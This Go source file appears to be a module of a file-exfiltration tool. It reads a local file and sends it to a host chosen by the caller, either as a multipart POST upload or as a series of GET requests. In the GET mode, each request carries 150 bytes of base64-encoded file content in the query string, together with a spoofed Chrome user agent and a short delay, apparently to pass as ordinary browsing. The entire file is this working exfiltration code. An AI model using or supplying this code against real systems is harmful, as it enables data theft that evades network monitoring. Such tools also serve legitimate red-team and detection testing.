package modules

import (
	"bytes"
	b64 "encoding/base64"
	"flag"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
const GETBUFFER = 150

func sendViaGet(url string, path string) {

	f, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()

	sendBuffer := make([]byte, GETBUFFER)
	rsent := 0

	for {
		n, err := f.Read(sendBuffer)
		if err != nil && err != io.EOF {
			break
		}
		if n == 0 {
			break
		}
		sEnc := b64.URLEncoding.EncodeToString(sendBuffer[:n])

		request, err := http.NewRequest("GET", url, nil)

		if err != nil {
			fmt.Println(err)
			return
		}

		request.Header.Add("User-Agent", USERAGENT)
		request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml")
		request.Header.Add("Accept-Language", "en-US")

		client := &http.Client{}
		q := request.URL.Query()
		// f param is the filename
		q.Add("f", path)
		// d param is the data
		q.Add("d", sEnc)
		// small sleep between requests
		time.Sleep(time.Duration(80) * time.Millisecond)

		request.URL.RawQuery = q.Encode()

		response, err := client.Do(request)
		rsent += 1
		if err != nil {
			fmt.Println(err)
			return
		}
		defer response.Body.Close()
	}

	fmt.Printf("Number of GET requests sent: %v\n", rsent)

}

func sendViaPost(url string, path string) string {

	errorCode := "0"

	f, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
		return errorCode
	}
	defer f.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(path))

	if err != nil {
		fmt.Println(err)
		return errorCode
	}

	io.Copy(part, f)
	writer.Close()
	request, err := http.NewRequest("POST", url, body)

	if err != nil {
		fmt.Println(err)
		return errorCode
	}

	request.Header.Add("User-Agent", USERAGENT)
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml")
	request.Header.Add("Accept-Language", "en-US")
	request.Header.Add("Content-Type", writer.FormDataContentType())
	client := &http.Client{}

	response, err := client.Do(request)

	if err != nil {
		fmt.Println(err)
		return errorCode
	}
	defer response.Body.Close()

	/*content, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
		return errorCode
	}*/

	status := response.Status
	return status
}

func HttpRun(data []string, file string) {

	if len(data) != 2 {
		flag.Usage()
		return
	}

	method := data[0]
	host := data[1]

	if method == "" || host == "" || file == "" {
		flag.Usage()
		return
	}

	method = strings.ToLower(method)

	if method != "get" && method != "post" {
		fmt.Println("Must specify GET or POST for the method.")
		return
	}

	// Get information on the file
	info, err := os.Stat(file)
	if os.IsNotExist(err) {
		fmt.Println("File does not exist")
		return
	}

	FILESIZE := info.Size()

	// Make sure the user didnt provide a directory
	if info.IsDir() {
		fmt.Println("Do not provie a directory")
		return
	}

	fmt.Printf("Sending file: %v (%d bytes) to %v\n", file, FILESIZE, host)
	var status string
	if method == "post" {
		status = sendViaPost(host, file)
	} else {
		sendViaGet(host, file)
		status = "200 OK"
	}

	if status != "200 OK" {
		fmt.Printf("Error with request: %s\n", status)
		return
	}
	fmt.Println("File sent!")
}
